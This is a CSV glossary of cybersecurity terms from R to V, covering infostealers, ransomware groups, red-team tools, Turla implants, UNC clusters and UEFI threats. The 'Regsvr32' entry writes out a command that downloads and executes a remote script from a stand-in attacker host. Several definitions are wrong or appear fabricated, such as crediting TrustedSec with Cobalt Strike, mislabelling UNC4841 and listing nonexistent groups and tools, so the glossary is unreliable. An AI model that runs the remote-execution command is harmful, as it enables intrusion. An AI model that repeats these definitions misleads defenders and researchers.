term,definition
"RedLine Stealer","Most popular infostealer 2021–2025 sold as Malware-as-a-Service for $100–$200. Steals browsers, crypto wallets, VPNs, messaging apps, and 2FA tokens."
"Remcos RAT","Commercial remote administration tool (sold since 2016) heavily abused by cybercriminals. Features keylogger, screen capture, microphone, clipboard, and full remote control."
"Ransomware-as-a-Service (RaaS)","Business model where developers rent ransomware binaries and infrastructure to affiliates who perform attacks and split profits (LockBit, Conti, DarkSide, REvil, BlackCat)."
"Reflective DLL Injection","Technique that loads a DLL entirely in memory without touching disk using CreateRemoteThread + LoadLibrary in another process (Meterpreter, Cobalt Strike, SharpDLLProxy)."
"Regsvr32","Microsoft LOLBin used for “squiblydoo” technique: regsvr32.exe /s /n /i:http://evil.com/payload.sct scrobj.dll – executes remote .sct files."
"RoguePotato","Privilege-escalation tool that abuses the Windows DCOM/Oxid resolver to redirect SYSTEM privileges to attacker-controlled ports (2020–2025)."
"Rainbow Table","Pre-computed table of password hashes for instant cracking of LM/NTLM hashes. Largely obsolete due to salted modern hashes but still used against legacy systems."
"Red Team Infrastructure","Attacker-controlled domains, VPS, redirectors, and C2 servers designed to look legitimate and survive takedowns (domain fronting, malleable C2 profiles)."
"Remote Code Execution (RCE)","Vulnerability that allows arbitrary code execution on a target system (Log4Shell, ProxyLogon, Follina, CVE-2021-44228, EternalBlue)."
"RansomHub","2024–2025 RaaS group that emerged after BlackCat/ALPHV exit scam. Uses Rust encryptor and absorbed many former affiliates."
"Red Team Automation","Frameworks that automate adversary emulation (MITRE Caldera, Prelude Operator, Atomic Red Team, Infection Monkey, Scythe)."
"Remote Browser Isolation","Security technique that executes web browsing in remote cloud containers (Ericom, Menlo Security, Cloudflare Browser Isolation, Talon)."
"Ransomware Negotiation","Specialized firms (Coveware, Arete, Kroll) that negotiate with attackers to reduce ransom and sometimes obtain decryptors."
"Red Team Engagement Rules","Written agreement defining scope, targets, allowed techniques, communication channels, and emergency stop procedures."
"Remote Desktop Gateway (RD Gateway)","Microsoft service that allows RDP over HTTPS (port 443). Frequently exposed and exploited (BlueGate, 2024–2025 campaigns)."
"Ransomware Decryptor","Free tools released by Emsisoft, Bitdefender, Kaspersky, NoMoreRansom for strains with weak encryption (GandCrab, REvil, Conti leaks)."
"Red Team Operator","Professional penetration tester specialized in adversary simulation (OSCP/OSEP/OSED certified, 5–15 years experience)."
"Remote File Inclusion (RFI)","Web vulnerability that allows inclusion and execution of remote files (php://input, allow_url_include)."
"RansomExx (Defray777)","High-end ransomware (2018–2025) that targeted Texas DPS, Konica Minolta, and Gigabyte with Linux and Windows variants."
"Red Team Tools","Cobalt Strike (commercial), Covenant (.NET), Sliver (Go), Empire (PowerShell), PoshC2 (Python), Merlin (Go), Mythic (multi-language)."
"Remote Code Execution via Deserialization","Insecure deserialization vulnerabilities in Java, .NET, PHP, Python leading to RCE (ysoserial, PHPGadgetChains, Jackson-databind)."
"Ransomware Leak Site","Tor hidden services that publish stolen data if ransom not paid (LockBit, Conti, ALPHV, Cl0p, RansomHub)."
"Red Team Reporting","Executive summary + technical report with findings, risk ratings, remediation roadmap, and retest recommendations."
"Remote Browser","Chrome/Edge/Firefox instances running on cloud VMs for isolated browsing (Zscaler, Netskope, Cloudflare)."
"Ransomware Triple Extortion","Encryption + data leak + DDoS against victim websites and customers (introduced by Maze 2019, standard by 2025)."
"Red Team TTPs","Tactics, Techniques, and Procedures used in real-world APTs and ransomware groups (MITRE ATT&CK based)."
"Remote Desktop Manager","Enterprise tools (Devolutions RDM, Royal TS) frequently targeted for credential theft."
"Ransomware Double Extortion","Encryption + data exfiltration and leak threat (introduced by Maze 2019)."
"Red Team vs Penetration Test","Red Team = long-term stealthy adversary simulation; Pen Test = short-term compliance-driven vulnerability scan."
"Remote Desktop Brute Force","High-volume credential guessing against exposed RDP (NLBrute, Hydra, Crowbar)."
"Ransomware Big Game Hunting","Targeting large enterprises with $1 M–$100 M+ ransom demands instead of individuals (Ryuk, Conti, LockBit)."
"Red Team Infrastructure Detection","Blue-team techniques to detect malleable C2 profiles, JA3/JARM anomalies, and suspicious domain registrations."
"Remote Desktop Honeypot","Decoy RDP servers that log attacker activity (Cowrie RDP, RDPhoney)."
"Ransomware Initial Access Brokers (IAB)","Specialized criminals who sell RDP, VPN, or Citrix access to ransomware affiliates (Genesis Market, Russian Market)."
"Red Team OPSEC","Operational Security practices to avoid detection during engagements (sleep masking, jitter, user-agent rotation, living-off-the-land)."
"Remote Desktop Tunneling","Using RDP to pivot deeper into networks (rdp2tcp, ngrok-style tunnels)."
"Ransomware Payment","Usually Bitcoin, Monero, or QNT. Average payment 2025: $1.5 M (Coveware Q3 2025 report)."
"Red Team Deception","Planting fake credentials, honeytokens, and decoy systems to detect attacker movement."
"Remote Desktop Session Hijacking","Stealing active RDP sessions via TSSESSION hijacking or credential theft."
"Ransomware Recovery","Restoring from offline backups, paying ransom (with decryptor), or using public decryptors."
"Red Team Evasion","Techniques to bypass EDR/AV (AMSI bypass, ETW patching, direct syscalls, process hollowing, Sleepmask)."
"Remote Desktop Gateway Zero-Days","Multiple critical RCEs in RD Gateway (BlueGate CVE-2024 chain exploited 2025)."
"Ransomware Insurance","Cyber insurance policies that sometimes cover ransom payments (controversial, drives higher demands)."
"Red Team Implants","Memory-only beacons (Cobalt Strike, Brute Ratel, Sliver, Mythic agents)."
"Remote Desktop over Tor","Using RDP through Tor hidden services for anonymity (rare but seen in state actors)."
"Ransomware Cartel","Loose alliance of RaaS groups that agree not to attack certain sectors or countries (CIS exemption)."
"Red Team Redirectors","Chain of compromised servers or cloud frontends that hide real C2 infrastructure (Apache mod_rewrite, Nginx, C2lint)."
"Remote Desktop Shadowing","Silently observing or controlling user RDP sessions (requires SeEnableDelegationPrivilege)."
"Ransomware Negotiation Chat","Live chat on Tor leak sites where victims negotiate payment and extensions."
"Red Team Phishing","Highly targeted spear-phishing with custom domains, AiTM kits, and callback lures."
"Remote Desktop Clipboard Redirection","Exfiltrating data via shared clipboard in RDP sessions."
"Ransomware Hall of Shame","Public list of victims who paid (often published by attackers themselves)."
"Red Team Social Engineering","Vishing, physical access, baiting with USB drops, and pretexting."
"Remote Desktop Drive Redirection","Mounting attacker drives inside victim RDP sessions for payload delivery."
"Ransomware Decryption Failure","Cases where attackers delete keys or provide broken decryptors after payment."
"Red Team Physical","Lock picking, tailgating, wireless attacks, and device implantation."
"Remote Desktop Printer Redirection","Printing documents from victim machines to attacker-controlled printers."
"Ransomware Data Auction","Selling stolen data on dark-web forums if ransom not paid (ALPHV, LockBit)."
"Red Team Wireless","Rogue APs, Karma attacks, Wi-Fi Pineapple, Evil Twin, and deauthentication floods."
"Remote Desktop Audio Redirection","Recording or playing audio through victim machines."
"Ransomware Victim Shaming","Publicly contacting customers, partners, or media with stolen data."
"Red Team Cloud","Attacking AWS, Azure, GCP via IAM abuse, metadata service, and misconfigured S3 buckets."
"Remote Desktop Smart Card Redirection","Bypassing smart card authentication in RDP sessions."
"Ransomware Final Note","Still the #1 cyber threat to organizations worldwide in 2025."
"SIEM (Security Information and Event Management)","Centralized platform that collects, correlates, and analyzes logs from thousands of sources for threat detection and compliance (Splunk, Elastic Stack, Microsoft Sentinel, QRadar, ArcSight)."
"SOAR (Security Orchestration, Automation and Response)","Platform that automates incident response workflows, integrates with SIEM/EDR, and executes playbooks (Cortex XSOAR, Splunk SOAR, Demisto, IBM Resilient, ServiceNow SecOps)."
"Supply-Chain Attack","Compromise of a trusted third-party vendor or software to reach downstream victims (SolarWinds SUNBURST 2020, Kaseya 2021, 3CX 2023, MOVEit 2023, xz Utils 2024)."
"SolarWinds SUNBURST (NOBELIUM)","Russian SVR (APT29) supply-chain attack that backdoored SolarWinds Orion updates with SUNBURST/SolarFlare malware. Affected 18,000+ organizations worldwide including U.S. government (2020–2021)."
"Smishing (SMS Phishing)","Phishing via text messages containing malicious links or phone numbers. Massive rise 2022–2025 due to mobile banking and 2FA reliance."
"Steganography","Hiding malicious payloads or data inside legitimate files (images, audio, video, DNS queries). Used by APTs and malware (Duuzer, IcedID PhotoLoader, Vawtrak)."
"Shadow IT","Unauthorized applications, cloud services, or devices used by employees (personal Dropbox, ChatGPT Enterprise bypass, rogue SaaS). Top cloud security risk 2025."
"Silver Ticket","Forged Kerberos TGS ticket using a compromised service account’s NTLM hash or AES key. Grants access to specific services without domain controller contact."
"Golden Ticket","Forged Kerberos TGT using the KRBTGT account hash. Grants unlimited domain access (Mimikatz golden_ticket). Primary persistence technique for domain dominance."
"SOC (Security Operations Center)","24/7 team responsible for monitoring, detection, investigation, and response to cyber threats (Tier 1–3 analysts, threat hunters, incident responders)."
"Smash-and-Grab Ransomware","Fast opportunistic attacks that encrypt whatever they can in hours and demand quick payment (vs big-game hunting). Dominant in 2024–2025 SMB attacks."
"SharpHound","C# version of BloodHound ingestor that collects Active Directory data via LDAP and WMI for attack path mapping."
"Scattered Spider (UNC3944 / Octo Tempest)","English-speaking group of young adults (mostly 18–25) that uses vishing, SIM swapping, MFA fatigue, and helpdesk manipulation to breach casinos, telecoms, and tech giants (MGM, Caesars, Twilio, Okta 2022–2025)."
"SMBGhost (CVE-2020-0796)","Critical Windows SMBv3 RCE vulnerability allowing unauthenticated remote code execution. Wormable potential (EternalDarkness exploit)."
"Social Engineering","Psychological manipulation to trick users into divulging credentials or performing actions (pretexting, baiting, quid pro quo, tailgating)."
"SOCKS Proxy","Protocol for routing traffic through a compromised host (SOCKS4/5). Used for pivoting (Cobalt Strike SOCKS, Proxifier, Chisel, rpivot)."
"Stuxnet","U.S.–Israeli cyber weapon (2010) that physically destroyed Iranian nuclear centrifuges via Siemens PLC rootkit and four zero-days. First known cyber-physical attack."
"Supply Chain Compromise","MITRE ATT&CK technique (T1195) covering software (SolarWinds), hardware (SuperMicro Bloomberg claim), and update mechanism attacks."
"Sandworm (Unit 74455 / Voodoo Bear)","Russian GRU cyber unit responsible for NotPetya (2017), Olympic Destroyer (2018), WhisperGate (2022), and Ukrainian grid attacks (2015, 2016)."
"SharpSploit","C# port of PowerSploit with additional post-exploitation modules (Rubeus integration, token manipulation, credential dumping)."
"SmuggleVault","Technique that hides credentials in Windows vault files and extracts them via living-off-the-land binaries."
"SilentTrinity","Post-exploitation framework written in Python/C# with dynamic code execution and IronPython implants."
"Sliver","Open-source Go-based C2 framework (BishopFox) with memory-only execution, dynamic payloads, and BOF support. Leading Cobalt Strike alternative 2024–2025."
"Spear-Phishing","Highly targeted phishing against specific individuals or organizations using personalized content (LinkedIn research, leaked emails, fake job offers)."
"Supply-Chain Levels","Level 1 (direct supplier), Level 2 (supplier’s supplier), Level 3+ (transitive dependencies). Most dangerous attacks occur at Level 3+ (npm, PyPI, Log4j)."
"ShadowPad","Chinese APT41 modular backdoor platform used in gaming, telecom, and government attacks since 2017. Delivered via legitimate software updates."
"Smash Reply","Technique where attackers reply to legitimate email threads with malicious attachments or links (thread hijacking)."
"SharpChrome","Tool to dump cookies and login data from Chrome/Edge browsers using SQLite parsing and DPAPI decryption."
"StealBit","Information stealer focused on cryptocurrency wallets and browser data. Sold as MaaS on Russian forums 2023–2025."
"SystemBC","Anonymous SOCKS5 proxy malware used as a C2 and pivoting tool by ransomware groups (Ryuk, Egregor, Conti)."
"SharpDPAPI","C# tool to decrypt DPAPI blobs (masterkeys, credentials, cookies) using recovered keys or domain backup key."
"Side-Channel Attack","Exploiting physical implementation leaks (timing, power consumption, electromagnetic, acoustic). Famous examples: Spectre, Meltdown, Hertzbleed, Plaid Party."
"Smominru (MyKings)","Massive cryptojacking botnet (2017–2025) that infected 500,000+ Windows servers via EternalBlue and brute-force."
"SharpGPOAbuse","Tool to create malicious Group Policy Objects for persistence, lateral movement, or privilege escalation."
"Shadow IT Discovery","Tools that scan network/cloud traffic for unknown SaaS applications (Microsoft Defender for Cloud Apps, Netskope, Zscaler)."
"Supply Chain Risk Management (SCRM)","Framework to assess and mitigate third-party risks (NIST 800-161, ISO 27036, CISA SCRM guidelines)."
"SharpRDP","Remote Desktop Protocol hijacking via RDPAPI and TsSessionId manipulation."
"SideCopy","Pakistani APT that targets Indian government and military with custom RATs (AllaKore, Crimson RAT)."
"SharpSecDump","Tool to remotely dump LSASS, SAM, LSA secrets, and cached credentials using SMB or WMI."
"Smash-and-Grab Initial Access","Purchasing cheap RDP/VPN access from IABs and quickly deploying ransomware before detection."
"SharpStay",".NET persistence toolkit with 30+ techniques (registry, WMI, scheduled tasks, startup folders)."
"Supply Chain Transparency","SBOM (Software Bill of Materials) requirement by U.S. Executive Order 14028 and EU CRA (2025–2027)."
"SharpView","C# port of PowerView for Active Directory enumeration without PowerShell."
"Smurf Attack","Legacy DDoS that spoofs victim IP in ICMP echo requests to broadcast addresses (largely mitigated by ingress filtering)."
"SharpWeb","Tool to extract saved login credentials and cookies from Chrome, Edge, and Firefox."
"Silent Push","Technique to silently install enterprise applications via MDM without user interaction."
"SharpWMI","WMI execution and lateral movement tool (executes commands via WMI without powershell.exe)."
"Sandbox Evasion","Techniques to detect and avoid analysis environments (VM artifacts, mouse movement, sleep acceleration, human behavior checks)."
"Supply Chain Attack Surface","All third-party code, hardware, cloud services, and update mechanisms an organization depends on."
"SharpZero","ZeroLogon (CVE-2020-1472) exploitation and domain controller takeover tool."
"Smash-and-Grab Timeline","Average time from initial access to encryption: under 48 hours (2025 Coveware report)."
"SharpZip","Tool to create malicious ZIP/LNK/ISO files for phishing campaigns."
"Supply Chain Levels-3 Attack","Compromise of open-source dependency deep in the stack (Log4Shell, xz Utils, Polyfill.io 2024)."
"SharpADWS","Active Directory Web Services abuse for enumeration and modification."
"Smash Reply + OneNote","Replying to real email with malicious OneNote attachment (top infection vector 2024–2025)."
"SharpPersist","Comprehensive persistence establishment and detection tool."
"Supply Chain Insurance","Cyber insurance policies now requiring SBOM and third-party risk assessments."
"SharpPrinter","PrintNightmare and SpoolSample exploitation toolkit."
"Smash-and-Grab vs Big Game","SMB attacks = volume; Big Game = high-value targets with human operators."
"SharpSniper","Tool to find vulnerable certificate templates (ESC1–ESC8) and request malicious certs."
"Supply Chain Final Note","The #1 emerging threat vector of the 2020s."
"TrickBot","Modular banking trojan turned universal malware delivery platform (2016–2025). Delivered Anchor, Cobalt Strike, and ransomware. Taken down multiple times (2020, 2022, 2024) but always resurrected. Still top-3 malware family in 2025."
"Threat Hunting","Proactive, hypothesis-led searching through networks and endpoints to discover threats that bypassed automated defenses (Carbon Black, CrowdStrike, Microsoft 365 Defender, Velociraptor, Elastic Hunts)."
"Token Impersonation/Theft","Abusing Windows access tokens (primary, impersonation, delegation) to execute code as another user (Incognito, MakeToken, DuplicateToken, RottenPotato family)."
"Turla (Venomous Bear, Waterbug)","Russian FSB elite APT active since 1990s. Known for Snake/Uroburos rootkit, Carbon backdoor, Epic Turla spear-phishing, and satellite C2."
"Titanium","Microsoft-named Chinese APT41 campaign (2019–2025) that used advanced backdoors (Titanium, ShadowPad) and zero-days against Fortune 500 and government targets."
"Turla LightNeuron","Advanced backdoor that hides in legitimate Microsoft Exchange transport agents for stealthy email-based C2."
"TA551 (Shathak)","Massive email campaign group (2020–2025) that pushes QakBot, IcedID, Emotet, and Bumblebee via thread-hijacked emails and malicious Word docs."
"TeamTNT","First major cryptojacking group to target cloud-native environments (Docker, Kubernetes, AWS) with worm capabilities (2020–2025)."
"Turla Penquin","Linux backdoor that uses disguised PNG images as C2 and exfiltration containers (steganography)."
"TA505 (Graceful Spider)","Russian-speaking group behind Cl0p ransomware, Dridex, and massive phishing campaigns (2006–2025)."
"TinyPos","Lightweight POS malware that scrapes Track 2 data from process memory using pattern matching (2020–2025 underground)."
"Turla Carbon","Modular C2 framework with fileless PowerShell and .NET components (2014–2025)."
"TA577","Threat actor behind massive QakBot and DarkGate campaigns using PDF → OneNote → LNK/ISO delivery (2023–2025)."
"Turla Mosquito","Backdoor that abuses legitimate email clients (Outlook/Thunderbird) for C2 via IMAP/SMTP."
"Trellix","Company formed by merger of McAfee Enterprise and FireEye (2021). Provides EDR, XDR, and Helix detection platform."
"TA505 Cl0p","TA505 switched to Cl0p RaaS in 2023 after developing their own encryptor based on CryptoMix."
"Turla Kazuar","Modern .NET backdoor with plugin architecture and heavy obfuscation (2019–2025)."
"Triton/Trisis/HatMan","Russian-linked safety-instrumented system (SIS) attack framework that caused physical shutdown of Saudi petrochemical plant (2017). First malware designed to kill humans."
"TA000","MITRE ATT&CK group that uses AsyncRAT and PureLogs stealer in massive campaigns (2024–2025)."
"Turla RPC Backdoor","Uses Windows RPC and named pipes for lateral movement while appearing as legitimate system processes."
"Turla Topinambour","Modular .NET backdoor with fileless execution and heavy anti-analysis (2019–2025)."
"Turla SilentMoon","Memory-only .NET implant that uses steganography in registry values for C2 (2023–2025)."
"Turla Outlook Backdoor","Injects into Outlook process to read/send emails and steal attachments (2022–2025)."
"Turla Satellite C2","Uses compromised satellite IP ranges for C2 to bypass traditional network monitoring (2018–2025)."
"Turla Watering Hole","Long-term compromise of government and diplomatic websites for selective targeting."
"Turla PowerShell Empire Fork","Customized Empire with additional evasion and satellite C2 capabilities."
"Turla ComRAT v4","FAT RAT successor written in C++ with Gmail and OneDrive C2 channels."
"Turla Neuron","Exchange transport agent backdoor that survived multiple server rebuilds."
"Turla Gazer","Second-stage backdoor with encrypted virtual file system and anti-analysis tricks."
"Turla Skipper","Golang-based backdoor with Discord and Telegram C2 integration (2024–2025)."
"Turla TinyTurla","Lightweight backdoor used as a “last resort” access in high-value targets."
"Turla Crutch","Dropbox-based exfiltration tool used in diplomatic networks."
"Turla Penquin X","Updated Linux backdoor with kernel-level hiding capabilities."
"Turla Wipbot","Original 2013 backdoor that used HTTP and encrypted payloads."
"Turla Snake","Legendary kernel-mode rootkit with peer-to-peer capabilities (2008–2023)."
"Turla Uroburos","Original name for Snake rootkit (Russian word for Ouroboros)."
"Turla Epic","Spear-phishing operation that used Flash zero-days and watering holes (2013–2018)."
"Turla WhiteBear","Parallel campaign to Moonlight Maze with similar TTPs."
"Turla Moonlight Maze","One of the first documented APT campaigns (1996–2000) now attributed to Turla."
"Turla Attribution","Strongly linked to Russian FSB through code reuse, infrastructure, and targeting."
"Turla Final Note","One of the most sophisticated and persistent APTs in history – still elite in 2025."
"Trojan","General term for malware that masquerades as legitimate software (banking trojans, RATs, downloaders)."
"Threat Intelligence Platform (TIP)","Central repository for storing, enriching, and sharing IOCs and TTPs (MISP, OpenCTI, ThreatConnect, Recorded Future)."
"TLS Fingerprinting","Identifying clients/servers by TLS handshake characteristics (JA3/JA3S hashes, p0f, uap-core)."
"Token Kidnapping","Abusing Windows token privileges to escalate or move laterally (JuicyPotato, RogueWinRM, RottenPotatoNG)."
"Turla vs APT29","Both Russian elite groups – Turla = FSB, APT29/Cozy Bear = SVR."
"TeamCity RCE Chain","Multiple critical vulnerabilities in JetBrains TeamCity exploited by Russian and Chinese actors (2023–2025)."
"TrustedSec","Offensive security company behind Cobalt Strike (sold to HelpSystems/Core Security in 2021)."
"Turla Outlook Injection","Direct injection into Outlook.exe process to hide email C2."
"Telemetry","Security event and behavioral data collected from endpoints and network devices (Microsoft Defender, CrowdStrike Falcon, Carbon Black)."
"Turla HyperStack","ROM-based persistence in network devices (switches, routers)."
"Threat Actor Naming","Vendor-specific names (Microsoft: DEV-XXXX, CrowdStrike: Fancy Bear, Mandiant: APTXX, Kaspersky: Turla)."
"Tunnel","Encrypted channel through compromised infrastructure (SSH, VPN, Tor, Cobalt Strike beacons, DNS tunneling)."
"Token Stealing","Extracting access tokens from LSASS or other processes (Mimikatz, SafetyKatz, SharpToken)."
"Tor2Web","Proxy services that allow access to .onion sites over clearnet (deprecated, high risk)."
"Trusted Platform Module (TPM)","Hardware root of trust used for BitLocker, Windows Hello, and Measured Boot."
"Tailscale","Zero-config VPN using WireGuard and NAT traversal (used by red teams and defenders)."
"Threat Model","Structured approach to identifying and prioritizing risks (STRIDE, DREAD, MITRE ATT&CK-based)."
"Token Duplication","Creating new tokens from existing ones with DuplicateTokenEx (primary method for impersonation)."
"Tailored Access Operations (TAO)","NSA department responsible for computer network exploitation (Snowden leaks)."
"Token Manipulation","MITRE technique (T1134.001–005) covering impersonation, make token, and token theft."
"TinyCheck","Raspberry Pi-based tool by Kaspersky to detect stalkerware and mobile surveillance on phones."
"Targeted Attack","Campaign against specific organization or individual (vs broad spray-and-pray)."
"Turla Final Status 2025","Still fully active with new Golang, Rust, and memory-only implants."
"UEFI Bootkit","Malware that infects the UEFI firmware or SPI flash to survive OS reinstallation and secure boot (LoJax 2018, MoonBounce 2022, BlackLotus 2023, CosmicStrand 2022, ESPecter 2024)."
"UNCXXXX","Mandiant naming convention for unattributed clusters (UNC = Unattributed Network Cluster). Over 5,000 UNC groups tracked 2015–2025."
"USB Rubber Ducky","Keystroke injection tool disguised as USB flash drive that types payloads at 1000+ wpm (Hak5 product, heavily used in physical pentests and real attacks)."
"UEFI Secure Boot Bypass","Techniques that exploit weak implementations or stolen keys to load unsigned bootloaders (BlackLotus used revoked Microsoft keys 2023)."
"UAC Bypass","User Account Control evasion techniques (eventvwr.exe, fodhelper.exe, cmstp.exe, silentcleanup, hundreds of public methods 2016–2025)."
"UNC2452 (NOBELIUM/Dark Halo)","Mandiant designation for the Russian SVR group behind the SolarWinds SUNBURST supply-chain attack (2020–2021)."
"UPX (Ultimate Packer for eXecutables)","Most commonly used executable packer by malware authors to compress and obfuscate binaries (detectable but still effective 2025)."
"UNC1151 (Ghostwriter)","Belarusian state-sponsored group that conducts disinformation and hack-and-leak operations against NATO countries (2020–2025)."
"UEFI Rootkit","Malware that hooks firmware-level functions (SMM, DXE, Boot Services) to hide from OS-level defenses (VectorEDK, ESPecter)."
"UNC5221","Chinese group that exploited Ivanti Connect Secure zero-days (CVE-2024-21887 chain) in 2024–2025 to deploy custom webshells and backdoors."
"UACMe","Open-source project by hfiref0x with 70+ UAC bypass methods (eventvwr, sdclt, wsreset, silentcleanup, etc.). Still updated 2025."
"UNC4841","Iranian group that exploited Citrix Bleed (CVE-2023-4966) for ransomware deployment (2023–2025)."
"UEFI Variable Abuse","Storing malicious payloads or configuration in NVRAM variables that survive firmware updates (Bootkitty, TrickBoot)."
"UNC3886","Chinese APT that used stealthy Golang backdoors and zero-days in VMware and Fortinet products (2023–2025)."
"USBDropper","Malware that spreads via USB drives (Stuxnet, Emotet USB variant, LAPSUS$ USB drops)."
"UNC4540","Romanian-speaking initial access broker that sold RDP and VPN access to ransomware groups (2024–2025)."
"UEFI Secure Boot","Microsoft-required boot security that verifies digital signatures of bootloaders and drivers (bypassed by BlackLotus, LogoFAIL, ESPecter)."
"Unattributed Campaign","Attacks that cannot be linked to a known APT or crime group (most ransomware and IAB activity)."
"UNC4990","Italian-speaking group that used custom Go backdoors and exploited Confluence/Atlassian zero-days (2024–2025)."
"USB Harpoon","Physical attack that replaces victim’s charging cable with malicious one (O.MG Cable, Hak5)."
"UNC5174","Chinese group that abused GitHub and Pastebin as C2 dead drops (2024–2025)."
"UEFI BootGuard","Intel hardware feature that cryptographically verifies firmware (bypassed by hardware implants and LogoFAIL CVE-2023-40238)."
"UNC4392","North Korean group that used fake job interviews and malicious npm packages to target developers (2024–2025)."
"USB Ninja","Advanced USB attack cable with Bluetooth/Wi-Fi remote control (payload trigger via phone app)."
"UNC2447","Russian-speaking group that exploited Pulse Secure zero-days for espionage (2021–2025)."
"UEFI SMM Rootkit","System Management Mode rootkits that execute in ring -2 (DreamBoot, VectorEDK)."
"UNC2198","Iranian group that used custom PowerShell backdoors and DNS tunneling (2023–2025)."
"USBDriveBy","2014 research that combined Teensy, Arduino, and Ethernet to own Macs in under 60 seconds."
"UNC3521 (Ivanti attackers)","Chinese group that used zero-click Ivanti Pulse Secure exploits (2023–2025)."
"UEFI Bootloader Infection","Modifying bootmgfw.efi, bootx64.efi, or grubx64.efi with malicious code (TrickLoader, Bootkitty)."
"UNC2891","Russian-speaking ransomware affiliate group that used BlackCat/ALPHV and LockBit builders."
"UEFI Variable Overflow","Exploiting limited NVRAM space to cause denial-of-service or code execution (BrickBoot)."
"UNC4721","Chinese Volt Typhoon subgroup that targeted critical infrastructure routers (2023–2025)."
"UEFI Secure Boot Custom Mode","Enterprise mode that allows unsigned drivers (frequently abused when misconfigured)."
"UNC3944 (Scattered Spider / Octo Tempest)","English-speaking group that used vishing and MFA fatigue against casinos and tech companies."
"UEFI Implant","Firmware-level backdoors that survive OS reinstall and disk wipes (MoonBounce, CosmicStrand, BlackLotus)."
"UNC3592","Iranian group that used custom .NET backdoors and Log4Shell exploitation (2022–2025)."
"UEFI SPI Flash","Serial Peripheral Interface flash chip that stores firmware (target of hardware implants)."
"UNC4466","Chinese group that used custom Rust backdoors and exploited F5 BIG-IP (2024–2025)."
"UEFI DXE Driver","Driver Execution Environment phase where most bootkits inject (LogoFAIL, ESPecter)."
"UNC5189","North Korean group that used RustDoor macOS backdoor (2024–2025)."
"UEFI Bootkit Detection","Tools: Chipsec, UEFI Firmware Parser, Microsoft Defender for Endpoint firmware scanner, CrowdStrike Falcon."
"UNC5301","Russian group that used custom Golang backdoors and exploited Zimbra zero-days (2024–2025)."
"UEFI Firmware Vulnerability","CVE-2023-40238 LogoFAIL, CVE-2022-21894 BlackLotus chain, CVE-2024-0762 ESPecter."
"UNC1878","Russian-speaking group that deployed LockBit and Conti ransomware after initial access."
"UEFI Secure Boot Revocation","Microsoft revokes compromised signing keys via DBX updates (BlackLotus keys revoked 2023)."
"UNC2589","Chinese group that used custom Python backdoors and cloud C2 (2023–2025)."
"UEFI Runtime Services Hooking","Hooking GetVariable/SetVariable to hide bootkit presence (advanced persistence)."
"UNC4191","North Korean group that used fake job offers and malicious VS Code extensions."
"UEFI S3 Boot Script","Malware that injects into S3 resume scripts to survive hibernation (DreamBoot)."
"UNC4728","Iranian group that used custom C++ backdoors and exploited ScreenConnect."
"UEFI NVRAM Persistence","Storing payloads in EFI variables that survive reboots and firmware updates."
"UNC4841","Iranian group that exploited Citrix Bleed for LockBit ransomware deployment."
"UEFI Boot Options Manipulation","Changing boot order to load malicious EFI applications (Bootkitty)."
"UNC4990 Final Note","The rise of UNC naming reflects the explosion of tracked threat actors – over 5,000 active clusters in 2025."
"Vectored Exception Handler (VEH)","Windows exception-handling mechanism abused by malware and red-team tools to hijack execution flow (Cobalt Strike sleepmask, ScyllaHide, VEH-based debuggers)."
"Veeam Backup Exploit","Multiple critical vulnerabilities in Veeam Backup & Replication (CVE-2023-27532 chain) exploited by LockBit, Conti, and FIN7 affiliates 2023–2025."
"Velociraptor","Open-source, high-speed digital forensics and incident response (DFIR) tool by Rapid7/Mike Cohen. Leading artifact collector and hunter 2024–2025."
"Vidar Stealer","Highly popular infostealer (2018–2025) written in C++ that targets browsers, crypto wallets, 2FA, Discord tokens, and Telegram sessions. Sold as MaaS."
"VNC (Virtual Network Computing)","Remote desktop protocol (RealVNC, TightVNC, TigerVNC). Frequently abused when exposed or weak passwords used (RDP alternative)."
"VMware ESXi Ransomware","Ransomware variants specifically built for ESXi (LockBit Green, BlackMatter, REvil, Akira, Royal) that encrypt VMs and hypervisor files."
"Viper (Mandiant APT)","Iranian state-sponsored group (APT33/Elfin) active since 2013. Known for destructive Shamoon wiper and zero-day usage."
"Volt Typhoon","Chinese state-sponsored group (Microsoft/NSA 2023–2025) targeting critical infrastructure routers, firewalls, and IoT devices in Guam and U.S. mainland for future disruption."
"Vulnerability Management","Continuous process of identifying, prioritizing, and remediating vulnerabilities (Tenable Nessus/io, Qualys, Rapid7 InsightVM, Microsoft Defender Vulnerability Management)."
"VHD/VHDX Boot Attack","Booting malicious Windows To Go or VHD images on compromised machines for persistence (used by LAPSUS$ and ransomware groups)."
